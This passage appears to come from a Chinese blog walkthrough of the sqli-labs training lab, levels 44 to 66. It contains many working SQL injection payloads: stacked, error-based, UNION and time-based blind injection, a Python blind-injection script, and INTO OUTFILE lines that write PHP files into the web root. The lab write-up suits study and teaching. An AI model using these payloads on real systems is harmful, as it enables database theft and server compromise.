+<p><img src="/images/sqli-labs/84.png" alt="84" decoding="async" loading="lazy" width="952" height="288"></p>
+<h2>Less-44</h2>
+<p>登录处理还是没有修复</p>
+<p><img src="/images/sqli-labs/85.png" alt="85" decoding="async" loading="lazy" width="711" height="490"></p>
+<pre><code class="language-sql">login_password=1' or 1=1;select '&lt;?=phpinfo();?&gt;' into outfile '/var/www/html/Less-44/1.php';%23&amp;login_user=admin&amp;mysubmit=Login</code></pre>
+<h2>Less-45</h2>
+<p>漏洞测试变成代码审计了（x），不想挨个测了，我直接看源码</p>
+<p><img src="/images/sqli-labs/86.png" alt="86" decoding="async" loading="lazy" width="777" height="507"></p>
+<pre><code class="language-sql">login_password=1') or 1=1;select '&lt;?=phpinfo();?&gt;' into outfile '/var/www/html/Less-45/1.php';%23&amp;login_user=admin&amp;mysubmit=Login</code></pre>
+<h2>Less-46 order by注入</h2>
+<p>order by注入，举例源码</p>
+<pre><code class="language-php">$sql = "SELECT * FROM users ORDER BY $id";
+$result = mysql_query($sql);</code></pre>
+<h3>order by + 数字</h3>
+<p>order by后的参数id可以作为一个注入点，可以尝试使用<code>?sort=1 desc</code>、<code>?sort=1 asc</code>，来检测order by后能不能拼接参数，构造一些sql语句，爆出数据</p>
+<pre><code class="language-sql">?sort=1 desc
+?sort=1 asc</code></pre>
+<p>尝试报错注入</p>
+<pre><code class="language-sql">?sort=updatexml(1,concat(0x7e,,0x7e),1)
+?sort=extractvalue(1,concat(0x7e,0x7e))</code></pre>
+<p><img src="/images/sqli-labs/87.png" alt="87" decoding="async" loading="lazy" width="857" height="343"></p>
+<p><img src="/images/sqli-labs/88.png" alt="88" decoding="async" loading="lazy" width="925" height="293"></p>
+<p>时间盲注，页面进入加载状态</p>
+<pre><code class="language-sql">?sort=if(1=1,sleep(5),sleep(5))</code></pre>
+<p><img src="/images/sqli-labs/89.png" alt="89" decoding="async" loading="lazy" width="840" height="479"></p>
+<p>写个时间盲注脚本</p>
+<pre><code class="language-python">import requests
+import string
+import time
+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://127.0.0.1:8080/Less-46/"
+i = 1
+print("脚本正在运行.......")
+while True:
+
+    for s in flags:
+        # 爆库
+        sort = "if((substr((select group_concat(schema_name) from information_schema.schemata)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)"
+        # 爆表
+        # sort = "if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        # 爆字段
+        # sort = "if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        tmp_url = url + "?sort=" + sort
+        start = time.time()
+        resp = requests.get(tmp_url)
+        end = time.time()
+        if end - start &gt; 0.1:
+            flag += s
+            # 当盲注出正确字符时，才去盲注下一位(变量i的作用)
+            i += 1
+            print(f"[#]------result: {flag}")
+            break
+        elif end - start &gt; 2:
+            print("跑了这么久，跑完了吗？跑完我给你停了🤓👍")
+            exit()
+        else:
+            pass</code></pre>
+<p><img src="/images/sqli-labs/90.png" alt="90" decoding="async" loading="lazy" width="1143" height="555"></p>
+<h3>order by + 数字 + procedure analyse(payload,数字)</h3>
+<pre><code class="language-sql">?sort=1 procedure analyse(updatexml(1,concat(0x7e,user(),0x7e),1),  )</code></pre>
+<p><img src="/images/sqli-labs/91.png" alt="91" decoding="async" loading="lazy" width="1069" height="273"></p>
+<h3>order by + 数字 + into outfile '文件路径'</h3>
+<p>把查询结果写入文件</p>
+<pre><code class="language-sql">?sort=1 into outfile '/var/www/html/Less-46/1.php'</code></pre>
+<p><img src="/images/sqli-labs/92.png" alt="92" decoding="async" loading="lazy" width="986" height="176"></p>
+<p>能写马子吗？好像可以的，使用<code>lines terminated by</code>来给写入的内容每一行末尾添加自定义内容！！🤯</p>
+<pre><code class="language-sql">?sort=1 into outfile '/var/www/html/Less-46/2.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e</code></pre>
+<p><img src="/images/sqli-labs/93.png" alt="93" decoding="async" loading="lazy" width="1284" height="220"></p>
+<h2>Less-47</h2>
+<p>利用order by 数字注入</p>
+<p>原来order by也可以<code>order by '0' or 1=1</code>这样</p>
+<pre><code class="language-sql">?sort=0' or updatexml(0x7e,version(),0x7e)%23</code></pre>
+<p><img src="/images/sqli-labs/94.png" alt="94" decoding="async" loading="lazy" width="997" height="256"></p>
+<p>order by + 数字 + procedure analyse(payload,数字)</p>
+<pre><code class="language-sql">?sort=0 procedure analyse(updatexml(0x7e,version(),0x7e),14514)%23</code></pre>
+<p><img src="/images/sqli-labs/95.png" alt="95" decoding="async" loading="lazy" width="1028" height="280"></p>
+<p>order by + 数字 + into outfile '文件路径'</p>
+<pre><code class="language-sql">?sort=0' into outfile '/var/www/html/Less-47/1.php'  lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23</code></pre>
+<p><img src="/images/sqli-labs/96.png" alt="96" decoding="async" loading="lazy" width="1278" height="323"></p>
+<h2>Less-48</h2>
+<p>这道题测试后台语法没有报错信息，直接试时间盲注</p>
+<pre><code class="language-sql">?sort=if(1=1,sleep(5),sleep(5))%23</code></pre>
+<p><img src="/images/sqli-labs/97.png" alt="97" decoding="async" loading="lazy" width="867" height="427"></p>
+<p>脚本梭哈</p>
+<pre><code class="language-python">import requests
+import string
+import time
+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://127.0.0.1:8080/Less-48/"
+i = 1
+print("脚本正在运行.......")
+while True:
+
+    for s in flags:
+        # 爆库
+        sort = "if((substr((select group_concat(schema_name) from information_schema.schemata)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)"
+        # 爆表
+        # sort = "if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        # 爆字段
+        # sort = "if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        tmp_url = url + "?sort=" + sort
+        start = time.time()
+        resp = requests.get(tmp_url)
+        end = time.time()
+        if end - start &gt; 0.1:
+            flag += s
+            # 当盲注出正确字符时，才去盲注下一位(变量i的作用)
+            i += 1
+            print(f"[#]------result: {flag}")
+            break
+        elif end - start &gt; 2:
+            print("跑了这么久，跑完了吗？跑完我给你停了🤓👍")
+            exit()
+        else:
+            pass</code></pre>
+<p><img src="/images/sqli-labs/98.png" alt="98" decoding="async" loading="lazy" width="866" height="556"></p>
+<p>写个马子</p>
+<pre><code class="language-sql">?sort=1 into outfile '/var/www/html/Less-48/1.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23</code></pre>
+<h2>Less-49</h2>
+<p>时间盲注猜闭合方式</p>
+<pre><code class="language-sql">?sort=0' or if(1=1,sleep(5),sleep(5))%23</code></pre>
+<p><img src="/images/sqli-labs/99.png" alt="99" decoding="async" loading="lazy" width="1177" height="425"></p>
+<p>猜出后台闭合方式可以直接改脚本了，或者写个马子进去</p>
+<pre><code class="language-sql">?sort=0' into outfile '/var/www/html/Less-49/1.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23</code></pre>
+<p><img src="/images/sqli-labs/100.png" alt="100" decoding="async" loading="lazy" width="1282" height="217"></p>
+<h2>Less-50</h2>
+<p>时间盲注猜出后台是，整数型</p>
+<p><img src="/images/sqli-labs/101.png" alt="101" decoding="async" loading="lazy" width="844" height="418"></p>
+<p>怎么跟<code>Less-48</code>一样？翻看源码，发现这道题可以堆叠注入了</p>
+<p><img src="/images/sqli-labs/102.png" alt="102" decoding="async" loading="lazy" width="293" height="80"></p>
+<pre><code class="language-sql">?sort=1;select '&lt;?php phpinfo();?&gt;' into outfile'/var/www/html/Less-50/1.php'%23</code></pre>
+<h2>Less-51</h2>
+<p>时间盲注猜出后台是，单引号类型</p>
+<pre><code class="language-sql">?sort=0' or if(1=1,sleep(5),sleep(5))%23</code></pre>
+<p><img src="/images/sqli-labs/103.png" alt="103" decoding="async" loading="lazy" width="944" height="495"></p>
+<p>末尾写马、堆叠写马、盲注</p>
+<pre><code class="language-sql">?sort=0' into outfile '/var/www/html/Less-51/1.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23</code></pre>
+<pre><code class="language-sql">?sort=0';select '&lt;?php phpinfo();?&gt;' into outfile'/var/www/html/Less-51/1.php'%23</code></pre>
+<h2>Less-52</h2>
+<p>时间盲注猜出后台是，整型</p>
+<pre><code class="language-sql">?sort=0 or if(1=1,sleep(5),sleep(5))%23</code></pre>
+<p>末尾写马、堆叠写马、盲注</p>
+<p>发现个小问题，前面<code>Less-51</code>写马的时候，字符型<code>order by '0'</code>成功写马，这道题整数型<code>order by 0</code>就失败了，换成<code>order by 1</code>可以正常写入</p>
+<pre><code class="language-sql">?sort=1 into outfile '/var/www/html/Less-52/1.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23</code></pre>
+<pre><code class="language-sql">?sort=1;select '&lt;?php phpinfo();?&gt;' into outfile'/var/www/html/Less-52/1.php'%23</code></pre>
+<h2>Less-53</h2>
+<p>时间盲注测试出后台是，单引号类型</p>
+<pre><code class="language-sql">?sort=0' or if(1=1,sleep(5),sleep(5))%23</code></pre>
+<p>末尾写马、堆叠写马、盲注</p>
+<pre><code class="language-sql">?sort=0' into outfile '/var/www/html/Less-53/1.php' lines terminated by 0x3c3f3d706870696e666f28293b3f3e%23</code></pre>
+<pre><code class="language-sql">?sort=0';select '&lt;?php phpinfo();?&gt;' into outfile'/var/www/html/Less-53/1.php'%23</code></pre>
+<h2>Less-54</h2>
+<p>老天奶，终于到page 4了</p>
+<pre><code class="language-plaintext">The objective of this challenge is to dump the (secret key) from only random table from Database ('CHALLENGES') in Less than 10 attempts
+For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.</code></pre>
+<p>在挑战次数小于10次时，数据库<code>CHALLENGES</code>会根据密钥生成随机表，超过10次，会根据密钥生成随机表，随机列，随机数据</p>
+<p>10命通关吗，有点意思</p>
+<p>或许也可以通过使用代理、切换浏览器、清楚cookie等方式绕过服务器的次数限制，这里好像是根据cookie记录的，次数快到了清楚cookie刷新页面</p>
+<p>测试后台闭合方式</p>
+<pre><code class="language-sql">?id=0'or 1=1%23</code></pre>
+<p><img src="/images/sqli-labs/104.png" alt="104" decoding="async" loading="lazy" width="1010" height="416"></p>
+<p>2，3为回显位</p>
+<p><img src="/images/sqli-labs/105.png" alt="105" decoding="async" loading="lazy" width="941" height="369"></p>
+<p>两个回显位，干脆一次爆表、爆字段</p>
+<pre><code class="language-sql">?id=0'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database())%23</code></pre>
+<p><img src="/images/sqli-labs/106.png" alt="106" decoding="async" loading="lazy" width="1879" height="415"></p>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=0'union select 1,2,(select group_concat(id,'-----',sessid,'-----',secret_3182,'-----',tryy) from B77BC4ZQI3)%23</code></pre>
+<p><img src="/images/sqli-labs/107.png" alt="107" decoding="async" loading="lazy" width="1553" height="412"></p>
+<h2>Less-55</h2>
+<p>测试后台闭合方式</p>
+<pre><code class="language-sql">?id=0) or 1=1%23</code></pre>
+<p><img src="/images/sqli-labs/108.png" alt="108" decoding="async" loading="lazy" width="934" height="360"></p>
+<p>爆表、爆字段</p>
+<pre><code class="language-sql">?id=0) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database())%23</code></pre>
+<p><img src="/images/sqli-labs/109.png" alt="109" decoding="async" loading="lazy" width="1920" height="417"></p>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=0) union select 1,2,(select group_concat(id,'-----',sessid,'-----',secret_3182,'-----',tryy) from B77BC4ZQI3)%23</code></pre>
+<p><img src="/images/sqli-labs/110.png" alt="110" decoding="async" loading="lazy" width="1900" height="296"></p>
+<h2>Less-56</h2>
+<p>测试后台闭合方式</p>
+<pre><code class="language-sql">?id=0') or 1=1%23</code></pre>
+<p><img src="/images/sqli-labs/111.png" alt="111" decoding="async" loading="lazy" width="922" height="355"></p>
+<p>爆表、爆字段</p>
+<pre><code class="language-sql">?id=0') union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database())%23</code></pre>
+<p><img src="/images/sqli-labs/112.png" alt="112" decoding="async" loading="lazy" width="1919" height="343"></p>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=0') union select 1,2,(select group_concat(id,'-----',sessid,'-----',secret_8N8A,'-----',tryy) from 07Z057A61B)%23</code></pre>
+<p><img src="/images/sqli-labs/113.png" alt="113" decoding="async" loading="lazy" width="1914" height="314"></p>
+<h2>Less-57</h2>
+<p>测试后台闭合方式，双引号类型 测了11次</p>
+<pre><code class="language-sql">?id=0" or 1=1%23</code></pre>
+<p><img src="/images/sqli-labs/114.png" alt="114" decoding="async" loading="lazy" width="899" height="306"></p>
+<p>爆表、爆字段</p>
+<pre><code class="language-sql">?id=0" union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database())%23</code></pre>
+<p><img src="/images/sqli-labs/115.png" alt="115" decoding="async" loading="lazy" width="1920" height="374"></p>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=0" union select 1,2,(select group_concat(id,'-----',sessid,'-----',secret_W1BG,'-----',tryy) from RGQEZ8TA8R)%23</code></pre>
+<p><img src="/images/sqli-labs/116.png" alt="116" decoding="async" loading="lazy" width="1910" height="334"></p>
+<h2>Less-58</h2>
+<p>测试后台闭合方式</p>
+<pre><code class="language-sql">?id=0' or 1=1%23</code></pre>
+<p><img src="/images/sqli-labs/117.png" alt="117" decoding="async" loading="lazy" width="1010" height="328"></p>
+<p>联合查询没有回显，但是测试过程有报错，报错注入</p>
+<p>爆表、字段</p>
+<pre><code class="language-sql"># 表名 1I2IZXOTD3
+?id=0' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</code></pre>
+<pre><code class="language-sql"># 字段名 id,sessid,secret_4FE6,tryy
+?id=0' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e),1)%23</code></pre>
+<p><img src="/images/sqli-labs/118.png" alt="118" decoding="async" loading="lazy" width="1861" height="394"></p>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=0' or updatexml(1,concat(0x7e,(select group_concat(secret_4FE6) from 1I2IZXOTD3),0x7e),1)%23</code></pre>
+<p><img src="/images/sqli-labs/119.png" alt="119" decoding="async" loading="lazy" width="1622" height="297"></p>
+<h2>Less-59</h2>
+<p>测试后台闭合方式</p>
+<pre><code class="language-sql">?id=0 or 1=1%23</code></pre>
+<p><img src="/images/sqli-labs/120.png" alt="120" decoding="async" loading="lazy" width="1046" height="322"></p>
+<p>爆表、字段</p>
+<pre><code class="language-sql"># 表名 K7RBPJ7JI6
+?id=0 or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))%23</code></pre>
+<pre><code class="language-sql"># 字段 id,sessid,secret_9FTK,tryy
+?id=0 or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e))%23</code></pre>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=0 or extractvalue(1,concat(0x7e,(select group_concat(secret_9FTK) from K7RBPJ7JI6),0x7e))%23</code></pre>
+<h2>Less-60</h2>
+<p>测试后台闭合方式</p>
+<pre><code class="language-sql">?id=0") or 1=1%23</code></pre>
+<p>爆表、字段</p>
+<pre><code class="language-sql"># 表名 FJ6S67618K
+?id=0") or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))%23</code></pre>
+<pre><code class="language-sql"># 字段 id,sessid,secret_BG4H,tryy
+?id=0") or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e))%23</code></pre>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=0") or extractvalue(1,concat(0x7e,(select group_concat(secret_BG4H) from FJ6S67618K),0x7e))%23</code></pre>
+<h2>Less-61</h2>
+<p>测试后台闭合方式</p>
+<pre><code class="language-sql">?id=0')) or 1=1%23</code></pre>
+<p>爆表、字段</p>
+<pre><code class="language-sql"># 表名 7L3F6QOYU6
+?id=0')) or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))%23</code></pre>
+<pre><code class="language-sql"># 字段 id,sessid,secret_RLGQ,tryy
+?id=0')) or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e))%23</code></pre>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=0')) or extractvalue(1,concat(0x7e,(select group_concat(secret_RLGQ) from 7L3F6QOYU6),0x7e))%23</code></pre>
+<h2>Less-62</h2>
+<p>为什么给了130次机会 🤯</p>
+<p>测出后台闭合方式</p>
+<pre><code class="language-sql">?id=0') or if(1=1,sleep(5),sleep(5))%23</code></pre>
+<p>时间盲注？130次时间盲注就是用二分法优化也不够用吧 🤯</p>
+<p>试试能不能写个马子进去</p>
+<pre><code class="language-sql">?id=0') union select 1,2,'&lt;?=phpinfo();?&gt;' into outfile'/var/www/html/Less-62/1.php'%23</code></pre>
+<p>成功</p>
+<p><img src="/images/sqli-labs/121.png" alt="121" decoding="async" loading="lazy" width="1282" height="443"></p>
+<h2>Less-63</h2>
+<p>测试后台闭合方式</p>
+<pre><code class="language-sql">?id=0' or 1=1%23</code></pre>
+<p>写个马子</p>
+<pre><code class="language-sql">?id=0' union select 1,2,'&lt;?=phpinfo();?&gt;' into outfile'/var/www/html/Less-63/1.php'%23</code></pre>
+<p>成功</p>
+<p><img src="/images/sqli-labs/122.png" alt="122" decoding="async" loading="lazy" width="1279" height="155"></p>
+<h2>Less-64</h2>
+<p>测试后台闭合方式</p>
+<pre><code class="language-sql">?id=0)) or 1=1%23</code></pre>
+<p>这回不写马子了，把查询结果写到文件里</p>
+<p>爆表、字段</p>
+<pre><code class="language-sql"># 表名 7L3F6QOYU6 
+# 字段 secret_RLGQ
+?id=0)) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database()) into outfile '/var/www/html/Less-64/1.php'%23</code></pre>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=0)) union select 1,2,(select group_concat(secret_RLGQ) from 7L3F6QOYU6) into outfile '/var/www/html/Less-64/2.php'%23</code></pre>
+<p>成功</p>
+<p><img src="/images/sqli-labs/123.png" alt="123" decoding="async" loading="lazy" width="486" height="97"></p>
+<h2>Less-65</h2>
+<p>测试后台闭合方式</p>
+<pre><code class="language-sql">?id=0") or 1=1%23</code></pre>
+<p>爆表、字段</p>
+<pre><code class="language-sql"># 表名 7L3F6QOYU6  
+# 字段 secret_RLGQ
+?id=0") union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database()) into outfile '/var/www/html/Less-65/1.php'%23</code></pre>
+<p>爆数据</p>
+<pre><code class="language-sql">?id=0") union select 1,2,(select group_concat(secret_RLGQ) from 7L3F6QOYU6) into outfile '/var/www/html/Less-65/2.php'%23</code></pre>
+<p>成功</p>
+<p><img src="/images/sqli-labs/124.png" alt="124" decoding="async" loading="lazy" width="463" height="102"></p>
+<p><del>我测，鬼打墙了，这两关表名、字段、数据一样？</del></p>
+<h2>Less-66</h2>
+<p>我的Less-66哪去了</p>
+<p><img src="/images/sqli-labs/125.png" alt="125" decoding="async" loading="lazy" width="1381" height="150"></p>
+<h2>最后</h2>
+<p>好像做完了？喵了个咪的，这个靶场质量太高了，感谢大佬们的分析以及总结，燃尽了</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf">mysql注入天书</a></li>
+<li><a href="https://tari.moe/2022/sqli-labs">sqli-labs 靶场 1-65 通关记</a></li>
+<li><a href="https://github.com/Audi-1/sqli-labs/tree/master">Audi-1/sqli-labs</a></li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>wp</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#SQL注入</span>
+                                    <span>#wp</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
